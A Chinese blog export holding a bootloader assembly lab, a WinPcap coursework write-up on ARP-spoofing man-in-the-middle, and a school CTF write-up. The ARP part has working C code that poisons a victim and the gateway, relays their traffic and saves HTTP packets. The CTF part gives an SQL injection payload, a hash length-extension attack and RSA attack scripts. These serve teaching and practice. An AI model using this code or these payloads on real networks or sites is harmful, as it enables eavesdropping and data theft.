;若输入长度不足17，则返回继续监测输入 jb int21 mov bx,offset msg0 ;定位到输入字符串 mov di,offset msg2 ;定位到数据存储段 call ASCIItoBCD ;将用户输入转为BCD码 mov di,offset s ;CMOS中时间参数的存储位置 mov dx,offset msg2 ;存储处理后的用户输入 call settime_s ;处理用户收入完毕，调用设置时间函数 call showtime ;时间设置完毕，显示当前时间 retsettime endp ASCIItoBCD proc ;输入参数为al 输出结果为al push cx ;保存现场 push di push ax push bp push bx mov cx,18 ;设置循环处理次数 A1: ;转为BCD码 第一步 mov al,cs:[bx] sub al,30h ;ASCII转为数字 mov cs:[bx],al ;存入原位置 inc bx loop A1 pop bx ;恢复输入字符串初始位置，准备第二步操作 push bx ;字符串初始位置入栈 mov cx,6 A2: ;转为BCD码 第二步 mov ah,cs:[bx] mov al,cs:[bx+1] ;得到前两个输入数据 push cx mov cl,4 shl ah,cl ;左移四位，存入高位 pop cx xor ah,al ;ah即为ah与al拼接的BCD码 mov cs:[di],ah inc di add bx,3 ;定位到下一个有效数据 loop A2 pop bx ;恢复现场 pop bp pop ax pop di pop cx ret ASCIItoBCD endp settime_s proc push cx ;保存现场 push di push ax push bp push bx mov cx,6 ;CX=6 mov bx,di ;BX指向s首地址, s为70端口每次所需要的入口参数数组的首地址 mov di,dx ;di指向存储处理后数据 set: mov al,cs:[bx] ;取当前需要的70端口的入口参数 out 70h,al ;al-&gt;PORT 70,指示71端口要取的数据 mov al,cs:[di] out 71h, al ;PORT 71-&gt;al，数据输入CMOS inc di inc bx ;自增后，继续设置 loop set pop bx ;恢复现场 pop bp pop ax pop di pop cx ret settime_s endp重启系统restart_sys proc ;系统重启函数 mov ax,0ffffh push ax mov ax,00h push ax retf ;将CS:IP恢复为0ffff：0000,重新启动restart_sys endp进入磁盘系统go_disksys proc ;进入操作系统函数 call Clearall mov ax,00h mov es,ax mov bx,7c00h ;设置存储数据的内存初始地址为0:7c00h ;设置用于启动硬盘系统的参数 mov al,1 ;读取的扇区数 mov ch,0 ;0磁道 mov cl,1 ;1扇区 mov dl,80h ;C盘 mov dh,0 ;0面 mov ah,2 int 13h ;调用int 13h的2号功能，根据以上参数读取磁盘信息到指定位置 mov ax,00h push ax mov ax,7c00h push ax retf ;将CS:IP设置为0000:7c00h，启动磁盘系统go_disksys endp修改颜色changecolor proc ;用于改变颜色的函数 push ax ;保存现场，函数中要用到的参数 push es push bp push bx push cx mov ax,0b800h mov es,ax mov bp,1 ;定位到显存第一个颜色位置 mov bl,es:[bp] ;读取此时屏幕的颜色 inc bl and bl,00000111b ;防止超出7 cmp bl,0 ;这里的判断是因为程序启动时， jne ccolor1 ;一部分颜色位可能没有初始化， inc bl ;会导致显示不稳定,颜色首先为黑色 and bl,00000111b ;通过判断，改变这种情况 ccolor1: mov cx,2000 changecolor_s: mov es:[bp],bl ;循环修改颜色位，作用范围是全屏 add bp,2 loop changecolor_s pop cx ;恢复现场，函数调用前的参数出栈 pop bx pop bp pop es pop ax retchangecolor endp其他所需子函数清屏Clearall proc ;清屏函数 push ax ;保存现场 push es push bp push cx mov ax,0b800h ;定位到显存位置 mov es,ax mov bp,00h mov cx,2000 clear_s: mov es:[bp],byte ptr ‘ ‘ ;全屏写入“ ” add bp,2 loop clear_s pop cx ;恢复现场 pop bp pop es pop ax retClearall endp显示一个以0为结尾标志的字符串show_str proc ;显示一段0标识结束的字符串 push ax ;保存现场 push cx push dx push si push bp push es mov ax,0b800h ;定位到显存位置 mov es,ax mov al,802; ;处理行号dh802 mul dh mov dh,0 ;接下来处理列号dl add dx,dx ;dx*2位一行中的偏移 add ax,dx mov bp,ax ;总的偏移 showoption: mov ch,ds:[si] ;定位到字符串 cmp ch,0 ;当数据为0时，显示完毕，退出 je showstr_back mov es:[bp],ch inc bp mov es:[bp],cl inc bp inc si ;修改显存以及字符指向，准备显示下一字符 jmp showoption showstr_back: pop es ;恢复现场 pop bp pop si pop dx pop cx pop ax retshow_str endp其他注意点在显示菜单时，本来使用了循环结构，但是显示总是乱码，于是采用了六次显示字符串的操作在修改时间时，本来想调用int21，接收用户的一个字符串的，但是没有个发生中断，因此采用了int16中断，通过循环以及容错控制模仿了近似int21的功能，允许用户输入或删除字符，并在左上角显示，必须输入17个字符后，点击回车才能执行修改时间的操作。为了显示用户的输入，需要修改显存，编程过程中，因为乱用寄存器，导致一直出错，修改显存时改为采用es段寄存器就不会出问题了实验过程记录准备工作加载软盘并格式化 烧录ULoader以及SYSTEM_U SYSTEM_U需要两个扇区 系统操作启动系统 按下5键修改颜色，采取的办法是避开黑色以及当前颜色代码加1 按下1键查看系统时间 按下5键修改颜色因为扫描用户输入的速度非常快，所以按下时会出现多彩闪烁的效果 按下Q键退回主菜单修改系统时间 初始界面： 根据格式输入时间（可以进行退格删除的操作）： 位数正确的情况下，按下回车，时间修改成功并立刻显示 此时，可以按5键修改颜色，或按Q键退回主菜单 查看此时的系统时间： 修改成功主菜单按下3键系统重启，依然来到主菜单主菜单按下4键启动磁盘系统 实验总结对系统是如何启动的有了更多的理解，了解了裸机编程的原理学习了查看以及修改时间的方法，对CMOS也更加了解，学习了端口读取数据，中断的使用方法对汇编指令进行实践，增加了熟练度同时，认识到在汇编编程中，寄存器使用要规范，不可以乱用，各个寄存器有各个寄存器的主要用途]]></content>
      <tags>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WinPcap编程——APR欺骗]]></title>
    <url>%2F2016%2F12%2F29%2FWinPcap%E7%BC%96%E7%A8%8B%E2%80%94%E2%80%94APR%E6%AC%BA%E9%AA%97%2F</url>
    <content type="text"><![CDATA[最近socket大作业布置了一道，实现arp欺骗的代码。。正好利用此机会学一学 一 实验要求利用WinPcap编程，实现基于ARP欺骗的中 间人攻击。 1）利用WinPcap，分别向被欺骗主机和网关发送APR请求包， 达到同时欺骗目标主机和网关的目的； 2）所有目标主机和网关之间的数据都会被我们劫持，过滤 两者之间的所有http交互数据包，并保存为文件。 （http包的过滤可用80端口来标识）二 实验原理1 选择网卡及过滤规则在这里特别注以下几点：1 . char packet_filter[] = “not arp”;//选择过滤的协议2 . / 跳转到用户选择的网卡 /for (d = alldevs, i = 0; i&lt; inum - 1; d = d-&gt;next, i++);/ 打开网卡 /adhandle = pcap_open_live(d-&gt;name,65536,1,1, //这里读取时间不要设置的太长，否则会超时errbuf);2 ARP欺骗主机和网关利用WinPcap，分别向被欺骗主机和网关发送APR请求包创建子线程，在子线程中实现arp欺骗//欺骗目标主机 unsigned char sendbuf[60], sendbuf1[60]; //arp包结构大小，42个字节 unsigned long dip, sip; dip = inet_addr(victim_ip);//目标ip sip = inet_addr(gateway_ip);//网关ip memset(eh.DestMAC, 0xff, 6); memcpy(eh.SourMAC, smac, 6); //以太网首部源MAC地址 memcpy(ah.smac, smac, 6); //ARP字段源MAC地址 memset(ah.dmac, 0x00, 6); memcpy(ah.sip, (const void)&amp;sip, 4); //ARP字段源IP地址 memcpy(ah.dip, (const void)&amp;dip, 4); //ARP字段目的IP地址 eh.EthType = htons(ETH_ARP); //htons：将主机的无符号短整形数转换成网络字节顺序 ah.hdType = htons(ARP_HARDWARE); ah.proType = htons(ETH_IP); ah.hdSize = 6; ah.proSize = 4; ah.op = htons(ARP_REQUEST); memset(sendbuf, 0, sizeof(sendbuf)); //ARP清零 memcpy(sendbuf, &amp;eh, sizeof(eh)); memcpy(sendbuf + sizeof(eh), &amp;ah, sizeof(ah));//欺骗网关 unsigned long Gate_dip, Gate_sip; Gate_dip = inet_addr(gateway_ip);//目标地址ip Gate_sip = inet_addr(victim_ip); memset(eh1.DestMAC, 0xff, 6); memcpy(eh1.SourMAC, smac, 6); //以太网首部源MAC地址 memcpy(ah1.smac, smac, 6); //ARP字段源MAC地址 memset(ah1.dmac, 0x00, 6); memcpy(ah1.sip, (const void)&amp;Gate_sip, 4); //ARP字段源IP地址 memcpy(ah1.dip, (const void)&amp;Gate_dip, 4); //ARP字段目的IP地址 eh1.EthType = htons(ETH_ARP); //htons：将主机的无符号短整形数转换成网络字节顺序 ah1.hdType = htons(ARP_HARDWARE); ah1.proType = htons(ETH_IP); ah1.hdSize = 6; ah1.proSize = 4; ah1.op = htons(ARP_REQUEST); memset(sendbuf1, 0, sizeof(sendbuf1)); //ARP清零 memcpy(sendbuf1, &amp;eh1, sizeof(eh1)); memcpy(sendbuf1 + sizeof(eh1), &amp;ah1, sizeof(ah1));3 截获HTTP报文识别HTTP包只在前面识别的基础上，通过协议头所定义的结构体识别是否为80端口。//保存http数据包 unsigned short int sourcePort = (unsigned short int )(pkt_data + 32); unsigned short int destPort = (unsigned short int )(pkt_data + 34); FILE fp; if (sourcePort == htons(80) || destPort == htons(80)) { fp = fopen(“http.http”, “ab”); if ( fp == NULL) { cout &lt;&lt; “failed !!\n”; return ; } fwrite(pkt_data, sizeof(unsigned char), header-&gt;len, fp); fclose(fp); }4 转发数据包通过识别mac地址，实现数据包的识别，继而修改数据包内容将其发送出去，具体实现如下 受害者向外发送数据if (!memcmp(pkt_data, smac, 6) &amp;&amp; !memcmp(pkt_data+6, dmac, 6))//受害者发包 { send = (unsigned char )pkt_data; memcpy(send, Gate_dmac, 6); //将目的MAC改为网关的MAC memcpy(send + 6, smac, 6); //将源MAC改为自己的MAC if (pcap_sendpacket(adhandle, pkt_data, header-&gt;len) == 0) cout &lt;&lt; “post succeed”; printf(“%d.%d.%d.%d -&gt; %d.%d.%d.%d\n”, ih-&gt;saddr.byte1, ih-&gt;saddr.byte2, ih-&gt;saddr.byte3, ih-&gt;saddr.byte4, ih-&gt;daddr.byte1, ih-&gt;daddr.byte2, ih-&gt;daddr.byte3, ih-&gt;daddr.byte4 ); printf(“A:%x.%x.%x.%x.%x.%x%x.%x.%x.%x.%x.%x\n”, pkt_data[0], pkt_data[1], pkt_data[2], pkt_data[3], pkt_data[4], pkt_data[5], pkt_data[6], pkt_data[7], pkt_data[8], pkt_data[9], pkt_data[10], pkt_data[11]); }受害者接受数据包if (!memcmp(pkt_data, smac, 6) &amp;&amp; !memcmp(pkt_data + 6, Gate_dmac, 6))//受害者收包 { send = (unsigned char )pkt_data; memcpy(send, dmac, 6); memcpy(send + 6, smac, 6); if (pcap_sendpacket(adhandle, pkt_data, header-&gt;len) == 0) cout &lt;&lt; “post succeed”; printf(“%d.%d.%d.%d -&gt; %d.%d.%d.%d\n”, ih-&gt;saddr.byte1, ih-&gt;saddr.byte2, ih-&gt;saddr.byte3, ih-&gt;saddr.byte4, ih-&gt;daddr.byte1, ih-&gt;daddr.byte2, ih-&gt;daddr.byte3, ih-&gt;daddr.byte4 ); printf(“C:%x.%x.%x.%x.%x.%x*%x.%x.%x.%x.%x.%x\n”, pkt_data[0], pkt_data[1], pkt_data[2], pkt_data[3], pkt_data[4], pkt_data[5], pkt_data[6], pkt_data[7], pkt_data[8], pkt_data[9], pkt_data[10], pkt_data[11]); }三 实验总结实验总体不难，但我在做得时候并不顺利，在其中体会到了一个道理，吃一堑长一智吧，那就是一定要知道自己每行代码再干什么。 一开始直接找了现成的选择网卡的代码，但直到最后调通之前才知道，那个代码是错的，根本就没有获取到TCP包~~~~，改了之后就好了。。。 并且在测试中发现，如果开wireshark抓包软件，那么受害者的网速会急剧变差。代码见附件]]></content>
      <tags>
        <tag>VC++</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[校赛 writeup]]></title>
    <url>%2F2016%2F12%2F26%2F%E6%A0%A1%E8%B5%9B%20writeup%2F</url>
    <content type="text"><![CDATA[web1.warmup-web打开响应消息头，发现路径/NOTHERE 访问即得flag2.web1看源码得到 index.txt&lt;?php$flag=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;$secret = xxxxxxxxxxxxxxxxxxxxxxxxxxx; // guess it length :)$username = $_POST[userna web1.warmup-web打开响应消息头，发现路径/NOTHERE 访问即得flag2.web1看源码得到 index.txt&lt;?php$flag=“xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx”;$secret = “xxxxxxxxxxxxxxxxxxxxxxxxxxx”; // guess it length :)$username = $_POST[“username”];$password = $_POST[“password”];$cookie = $_COOKIE[‘albert’];if (!empty($_COOKIE[‘albert’])) {if (urldecode($username) === “admin” &amp;&amp; urldecode($password) !==“admin”) { if ($_COOKIE[‘albert’] === md5($secret . urldecode($username . $password))) { echo “Congratulations! here is your flag.\n”; die (“The flag is “. $flag); } else { die (“Cookie Not Correct”); }}else { die (“Go AWAY”);}}setcookie(“sample-hash”, md5($secret . urldecode(“admin” . “admin”)), time() + (60 60 24 7));?&gt;&lt;!– index.txt –&gt;由题易知是hash长度扩展攻击 在kali下运用hashpump进行攻击一开始不知道长度，利用爆破可知长度为26位&gt;&gt; hashpumpInput Signature: 968c31570a2a3afa076112687ecca974Input Data: adminInput Key Length: 26Input Data to Add: pcat3.web2这题直接运用kali DirBuster 扫描目录扫到了 /x/index.php /.php /x/register.php /x/connect.php /x/login.php /flag.php 最终答案在/flag.php中 4.web4一道简单的报错注入题 利用burp截包修改id 最后payload为id=1%27 and extractvalue(1,concat(0x5c,(select password from albertchang),0x5c,1))%23或者是id=-1%27 or extractvalue(1,concat(0x5c,(select password from albertchang),0x5c,1))%23出来后 根据提示需要post flag = Th3_Pas3W0rd_i3_Albertchang 最后得到flag 5.web6拿到这题时直接分析，网页源码 发现了隐藏的HTML文档 知道了这题的知识点 流密码其实就是逐比特异或 在隐藏部分发现异或过后的flag flag 的长度大于500 所以构造提交参数大于500和message逐比特异或 写脚本如下 这里有个坑，我用requests方法请求网页，获取不了隐藏的HTML内容 所以只能使用httplib方法 # yz:2016.12.25 # -- coding:utf-8 -- import stringimport httplib,urllibdata = urllib.urlencode({‘arg’:‘11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111’});conn = httplib.HTTPConnection(“45.32.58.123:12223”);headers = {“Content-Type”:“application/x-www-form-urlencoded”, “Connection”:“Keep-Alive”,“Referer”:“http://45.32.58.123:12223/“};conn.request(method=“POST”,url=“/main.php”,body=data,headers=headers);s = conn.getresponse();content = str(s.read())Message = content[content.index(“Message:”)+9:content.index(“&lt;!– Flag Here”)-6]Message = Message.replace(r’\x’,“”)Message = int(Message,16)Flag = content[content.index(“Here”)+5:content.index(“–&gt;&lt;/body&gt;”)]s = ‘’#转成01比特for i in Flag: temp = ord(i) temp = bin(temp) temp = str(temp)[2:] if len(temp) &lt; 8: temp = ‘0’(8-len(temp))+temp s += tempFlag = int(s,2)src = 200686490938213618932925030686723900966346071385575706818931139925151927414142413276833387391430903367465157760813819133574082739102368183356464973743987837722948595492712901641873403594450204695713629139533103392519371071099952645246840782481900957871935637359154437252913405444179654300427180044691385965990823568106696476515287748546363867017174091051797450964111012257685851865814304288305868868796070362487761893449386893361922901844324634350334616783957894220005538964792468979405328145100453460098854853839989027847783206845004095945185162744506591411155318233223679027298329085177274095914773286471049161702613799175486411492003372288722716950913877957802694948679785419083224812096387329082981115878996013259272222472356069166820222490810121435442820722489119884073056358155724651716232802987659573867435059545130785856458655309902770151770043405778785036718566031651260115600041084237592155873140867644089767487877289411629787419400386757597222832981129288874883921314078446307643819572105712219875309974530695306897012252757579812647497998317030864635355185457048473443750962962325959236879327971895179877812488472241671023567097665713934032193125740463764283516105833757192335092325954137896621052635084041994822566883633Lend = Flag^Message^srcs = str(hex(end))[2:][:-1]string = ‘’for i in range(0,len(s),2): string += chr(int(s[i:i+2],16))print stringconn.close(); 最后得到misc1.warmup-miscs=‘UAUSAB1QUFBQUFAbfQ==’def decode(s,k): r=s.decode(‘base64’) l=‘’ assert len(k)==1 for i in r: l = l + chr(ord(i)^ord(k)) return l[:-1]print decode(s,‘f’)2.zlmm栅栏密码import res=“F e canece odouarld{iarswsitt o N fsseo zvgiyeipioantehi t ancheocm gaous oganwiakgaa ,absntns l rd ic p+s notei. aimo ttejtntlca,lado d gi bhh.ooiiao in nTeghlseee y gvnrgicdt hcrtlle rIoehimern hPire ianfituntti e sterseaoov ln sd ymyawho o etfnesagc o.aethadEcm ssem adtff6a odamlocbh aeimah l6rAsoyaamaeoowrsneyeba6smew,nmemapfhe j b ag}”l = len(s)child = []for i in range(1,l): if l%i == 0: child.append(i)for j in child: s1=‘’ k = str(j) r = re.findall(‘[^~]{‘+k+‘}’,s) for i in range(0,j): for j in r: s1 = s1 + j[i] if ‘flag’ in s1: print s1 break3.warmup-cryptoBH=CWG=EO=IEI=;DEDEDEY 观察可得是凯撒密码s = ‘BH=CWG=EO=IEI=;DEDEDEY’l = len(s)for j in range(25,50): d = ‘’ for t in s: d = d + chr(ord(t)+j) if ‘flag’ in d: print d4.warmup-game在bibi的游戏人生里找warmup-rsan1=0x18f60afa6b9938df69338805ae7fbd5652da3ac8fa5b7b65e4755149ba3f80d071fe8845fa20ea3e57e21fb2f630e47e4886de35c51d1487c170a59141f833c3aaea62c539e20664dbfa75f1b2d56ed4dbec991e5bf3306931bfda79b1dd8466f808af159b44be042499d423110ab9cfd595e370029862e2e686ed2a27fb6b459c4fddc0ebd4f112e0f3769524412e7128eb04b02de421df5a0e5b22d2c40acf1727aa9093160bf6dbd862ac136a805a4e9c760c54d28ac5bf21d509d94e9e437e2e38a13664ec104dadc66f8c21b7b82e3e3570d27326e13df07dd72b6847f8e53aadeafa54cc879cfa2ae3b8028c39df36b097ba65688abadb78a06c16f393Ln2=0x18f60afa6b9938df69338805ae7fbd5652da3ac8fa5b7b65e4755149ba3f80d071fe8845fa20ea3e57e21fb2f630e47e4886de35c51d1487c170a59141f833c3aaea62c539e20664dbfa75f1b2d56ed4dbec991e5bf3306931bfda79b1dd8466f808af159b44be042499d423110ab9cfd595e370029862e2e686ed2a27fb6b459c4fddc0ebd4f112e0f3769524412e7128eb04b02de421df5a0e5b22d2c40acf1727aa9093160bf6dbd862ac136a805a4e9c760c54d28ac5bf21d509d94e9e437e2e38a13664ec104dadc66f8c21b7b82e3e3570d27326e13df07dd72b6847f8e53aadeafa54cc879cfa2ae3b8028c39df36b097ba65688abadb78a06c16f393Le1=0x17e1e2=0x43a5c1=0xb6e66aa0d4d5ad1460482f45aab87e80a99c1ff3af605fd9cea82d76d464272f3dd2e1797e3fede64cffcd54b2a7a5e21f45574783f62266cebf3cdb9764c6c04b0b30b5d065d5f6142d498506ea1f6449f428253d4d76bd96778d5f58abf313370b980dcb90daf882c5539ac3df81a431bc2c0e0911ecbe5195d94312218b3854ee14f13bd00c81d7ff11c06a9e112940b7377c20e53738a2ebb77b0534d8d9e481e60e9c87693bd9e1fd1e569083479ff8f53e42337a2b799c2325a7e2588fb046cf228d01d8596e7af4570a3cb0635d2524d234e3993d76b7e60f1c478ba45891de5cc0a1fec116f7c0dd9be7aa54226edf0196e37856afca32c69d790e1Lc2=0x9bcbfea3c3130364bbcf352b7810df031293949ed147919dec3ecfdd48f77e9486ae811d95f8c79eb477f4424d475dc611536343c7e21c427e18593aae37982323f2c0f4e840fbf89b31edc8f79ad7f6511ee0e5605cfbba7ada7d8777e81ec0ac122e0ad5108e97fafc0cd31ed8c83f3e761b92bdbea1144b0c06c5ca43a7b4e9e0a2b15ee12509235c5695be54d9fd0725ac80abbf0f5e8f43539da3ce9464020099e031d8bca899f11638169196ac72aeaeb90dab851d801cf93044cc00dd94d93c8963201b26788a7c42ce45c496c0a597ac53cd55c60b8f38f3f7d1f8ecc2e4e40ba6fe0c6e605ebbfc9aa3da5ab810c783c1d9957bb5d00a89ab1bbdeL发现n1与n2相等，故使用共模攻击#coding=utf-8import sys;sys.setrecursionlimit(100000);def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) y, y)def modinv(a, m): g, x, y = egcd(a, m) if g != 1: raise Exception(‘modular inverse does not exist’) else: return x % mdef main(): n = int(raw_input(“input n:”)) c1 = int(raw_input(“input c1:”)) c2 = int(raw_input(“input c2:”)) e1 = int(raw_input(“input e1:”)) e2 = int(raw_input(“input e2:”)) s = egcd(e1, e2) s1 = s[1] s2 = s[2] # 求模反元素 if s1&lt;0: s1 = - s1 c1 = modinv(c1, n) elif s2&lt;0: s2 = - s2 c2 = modinv(c2, n) m = (c1**s1)(c2s2)%n print mif name == ‘main‘: main()最后得到明文 2511413510842060413510067286707584738156534665355713590653 转为16进制，再转ascii得到flag flag{rsa_is_goodd112345}5.wn低解密指数攻击 直接利用GitHub上的代码‘’’Created on Dec 14, 2011@author: pablocelayes‘’’import ContinuedFractions, Arithmetic, RSAvulnerableKeyGeneratordef hack_RSA(e,n): ‘’’ Finds d knowing (e,n) applying the Wiener continued fraction attack ‘’’ frac = ContinuedFractions.rational_to_contfrac(e, n) convergents = ContinuedFractions.convergents_from_contfrac(frac) for (k,d) in convergents: #check if d is actually the key if k!=0 and (ed-1)%k == 0: phi = (ed-1)//k s = n - phi + 1 # check if the equation x^2 - sx + n = 0 # has integer roots discr = ss - 4*n if(discr&gt;=0): t = Arithmetic.is_perfect_square(discr) if t!=-1 and (s+t)%2==0: print(“Hacked!”) return ddef test_hack_RSA(): print(“Testing Wiener Attack”) times = 5 d=1 e=235308230249427956073994778236213308201165228968967264823632398966978083858618015310724273760982061608902488436041676909915097228896544054764485576608147425983433627672556840438360922524333914861841915302324033903747815478440207839231405164459309430488083417021299863448530761603691583119435411334929236989305080703733969737477059347874381118819315342999662421300865938367414646348114114523518559518198427990964401454548211551305162678178910564008966603832884326159914009915068561450603480793388907172483641086337688420637151051921455148790521653521635779290202539763111269020386581967559996128236288594127596931111L n=990023173701890142960417396557829467604818405521894936859951202214773485865832785292323872121243887697290422045990013422607876480641270661367864382389893789596078312082027665553855270696451019054919069134732452191977525630655976091851072534780363846681322224621650105419018181198428165007342791192003551280877541234686022585373169611329463075555962420262841398957747472053420414997254472168650615854344763306064291593967460854817443906609759558144854063757076283269500492727802851281783673232830692457911612959175538769194685797000335876443248126827447575107633034183744580751790001353796972802669451070935734931493L print(“(e,n) is (“, e, “, “, n, “)”) hacked_d = hack_RSA(e, n) print(“d = “, d, “, hacked_d = “, hacked_d) print(“————————-“) times -= 1if name == “main“: #test_is_perfect_square() #print(“————————-“) test_hack_RSA()解出d = 30011Ln = 990023173701890142960417396557829467604818405521894936859951202214773485865832785292323872121243887697290422045990013422607876480641270661367864382389893789596078312082027665553855270696451019054919069134732452191977525630655976091851072534780363846681322224621650105419018181198428165007342791192003551280877541234686022585373169611329463075555962420262841398957747472053420414997254472168650615854344763306064291593967460854817443906609759558144854063757076283269500492727802851281783673232830692457911612959175538769194685797000335876443248126827447575107633034183744580751790001353796972802669451070935734931493Lc = 788476757386221543537703608890186546442886644502803697518028267920600460220013483242506024987780673274894640972913419348131638674650297913257698380629030789425241326400460779957736137653911242371819455834503315030302866040645836290957691445959653938430879900694828439435699643144568320527205094071390940553388594203187022623769818515793107513956737821245415004711757450202148161254040561612359947403387404625171790678861784947278421483221298384341596583699883571547913038896065048203584687131767988397347080214823075357248539577208665545930392234612492615041261379339566841377463503145318178415053741856403946928895Lm = cd % nprint m6.D0ge下载bftoolsC:\Users\YZ&gt;C:\Users\YZ\Desktop\bftools\bftools\bftools.exe decode braincopter C:\Users\YZ\Desktop\D0ge.jpg -o -out.bfC:\Users\YZ&gt;C:\Users\YZ\Desktop\bftools\bftools\bftools.exe run -out.bfGYYWIY3UMZ5UQML6IIYHSLCXMVWEGMDNMUWVI3ZNJAZVEZL5base32解码得到flag7.crypto300 basr下面为源代码，分析起来比较简单，但是坑比较多。from Crypto.Util.number import getPrime, long_to_bytes, bytes_to_longimport stringimport randomdef pen(msg,k): myl=string.printable[0:62]+“+/“ nell=[“”]64 for i in range(64): nell[(i+k)%64]=myl[i] #copy myl to nell nel=“”.join(nell) msg+=“/x00”(len(msg)%4) bs=“” for i in msg: bs+=“0”(8-len(bin(ord(i))[2:]))+bin(ord(i))[2:] print bs c=“” for i in range(0,len(bs),6): c+=nell[int(bs[i:i+6],2)] return cdef backdoor(p,k): q2=getPrime(1024) n2=pq2 print “q2”,q2 print “n2”,n2 return n2^(k%64)def main(): flag=open(“flag”,“r”).read().strip() m=bytes_to_long(flag) print “m”,m p=getPrime(1024) print “p”,p q=getPrime(1024) print “q”, q n=pq print “n”,n s=“” s+=hex(n)+“\n” e=65537 c=pow(m,e,n) print “c”,c cipher=long_to_bytes(c) k=random.randint(0,0xffffffffff)#get assume len random print “k”,k s+=pen(cipher,k)+“\n” s+=hex(backdoor(p,k)) open(“info”,“w”).write(s)if name == ‘main‘: main()下面是我写的解密脚本# encoding:utf-8from libnum import gcd,invmodfrom Crypto.Util.number import bytes_to_longimport stringn=0x74fa9956e470bfa8501b4ff98ce6687ba37e2b7ce5592ff61c96379c1df04f2af91ab7b9da4935dc1a9860b203e0012bd7855845ad51d28b221d3eeb5d841bd65247ab39aab7635d3767e439e930127c20b6dc2bbf526de67d1f2cbbe798c031665dbb033a07247966b0f9988aac0d7ff7736d6cd39d35f74a88956c9b8d1c7b4177195ff50bab7e9af211c9e09c7b6345733fb41380c678bc1d0b80f21eb80d3bb2338f2da692bb588a853eea2bfd9091d31e7d14aa504f4073a1afb819e8edc336755e29ca11852d8efc0bd8f1d454ae4a698fd18e1edaa8649a6077fd3a4638b6aafbe1eb37a78aff52e8a056c92ddf4ed1f3cbeab89748b95ef09f70d1d7Lc=‘O7P6yC21fCJYE8NbvkNnmxQihBUYIBpHz606MZeUZW14C0SA8CFcm+RaOTTftwJyEhlW7x1KeIG7ZGsd0HeRhcb3/wJIkY7dPmywHxv+78tlHSUtxEsS4dT/fY3Hxj1hrP75ZjQ24r3wM0PsY79G9MIDvVqg3p2NybP0NYxXhfZGJHNELlubpcGGW/YtZIGYX8QXtOZZvbVdQBL0xBrBxzZNTUGIJjCUY5+RxuAITsbDVwTi1QX2SSv28p6+vgmpkul/rL9pXQk0M6CKKI+SWJjFaKrtSlYho5o/tGSISi74taq0r4Jef/zlctbYg6oy4qRUp4Qs+l5RYokPKaYIaN’backdoor_p=0x76d72e0b530ed5c3cf09273bb1e452f913ef648420a003d9f08ee8bdbc96f6bf999a3f51f08fa3c9bb2434374f41a201c7d5fc6ffec50c3bc32c84a6c21dff5f7a567558e3b82aef4c4c301c2c3d7c6657fb3135a032302c772842956582224dcef66f8c812c57f6902adc0edb97d80d8feffb2d06951741a31c3a992bf5e79f430b02300a39834c97a683c665566dadaaff771fd5278ce1001cd9cde888c319c909d15b0ce3d6fa871f674541cb2a78c6edf058335cbbf1cfc54ecf441da7baaf46d6903eacb8fcfa32602dec3a4aa50e60cc51f49042bb4681bbf0f16ec6fd0241ddf697cf224de602aeb5276c02a27f39a4853cd044cdee6dc216ed497b1bLk = ‘’q = ‘’for i in range(64): p = gcd(backdoor_p^i,n) if p != 1: k = i break#print pq = n/pf_n = (p-1)(q-1)e=65537d=invmod(e,f_n)print dmyl=string.printable[0:62]+“+/“nell=[“”]64for i in range(64): nell[(i+k)%64]=myl[i] #copy myl to nellnel=“”.join(nell)bs = ‘’for i in c[:-1]: d1 = nell.index(i) bs += ‘0’(6-len(bin(d1)[2:]))+bin(d1)[2:]bs += bin(nell.index(c[-1:]))[2:]msg = ‘’for i in range(0,len(bs),8): msg += chr(int(bs[i:i+8],2))msg = bytes_to_long(msg)print msg#print stringprint hex(pow(msg,d,n))[2:-1].decode(‘hex’)这一题逻辑上比较简单reverse1.warmup-reHint1: username:goodgoodstudydaydayup 拖进IDA中直接F5if ( v15 &gt;= v16 ) break; v44 = v19[i]; v43 = v20[i]; v21[i] = v43 ^ v44; v9 = (unsigned int)v21[i]; if ( (_DWORD)v9 != (&amp;v22 + i) ) { LODWORD(v13) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;((_QWORD )&amp;argc, argv, “key error”, refptr__ZSt4cout); std::ostream::operator&lt;&lt;( (_QWORD )&amp;argc, argv, refptr__ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0ES6, v13); system((_QWORD )&amp;argc, argv, v14, “pause”); return 0; }}LODWORD(v17) = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;( (_QWORD )&amp;argc, argv, “Yes!input is flag”, refptr__ZSt4cout); 分析得到： 只需将代码中的数与username的值异或即可s = ‘goodgoodstudydaydayup’a = [86, 30, 24, 1, 21, 90, 27, 29, 6, 29, 76, 84, 22, 20, 85, 28, 22, 21, 30,29, 23]l = ‘’for i in range(0,len(s)): l = l + chr(a[i]^ord(s[i]))print l2.android直接用jeb反汇编 找到m字符串 找到其中的12~24位即得flag3.CrackMeIDA进去之后 四关 1.输入素数 直接看代码分析出为2 2.计算数字 用c语言代码计算得出为654321 3.计算字符串d = ‘’s = ‘MerryChristmas’a = [1,2,3,4,5,6,1,2,3,4,5,6,1,2]for i in range(0,14): d = d + chr(ord(s[i])-a[i])print d4.计算flag的值s = ‘Lcont=gpfoog`q’flag = 654323tmp = 0x1E240mod = 0x3B9ACA07#flag = (flag + (signed int)v5 tmp) % mod;for i in range(0,14): flag = (flag + ord(s[i]) tmp) % modprint flag直接输入flag的值，会给出flag4.61dre为linux下程序，先拖入IDA简单看一下发现代码比较复杂，判断条件，跳转都比较多，处理字符串的主要程序在： while ( 1 ) { v5 = (v17)[1]; v13 = (_DWORD )v20; v6 = strlen(v5); if ( v13 &gt;= v6 ) break; if ( !(((unsigned int8)((y &lt; 10) ^ ((((_BYTE)x - 1) (_BYTE)x &amp; 1) == 0)) | (y &lt; 10 &amp;&amp; (((_BYTE)x - 1) (_BYTE)x &amp; 1) == 0)) &amp; 1) ) goto LABEL_24; 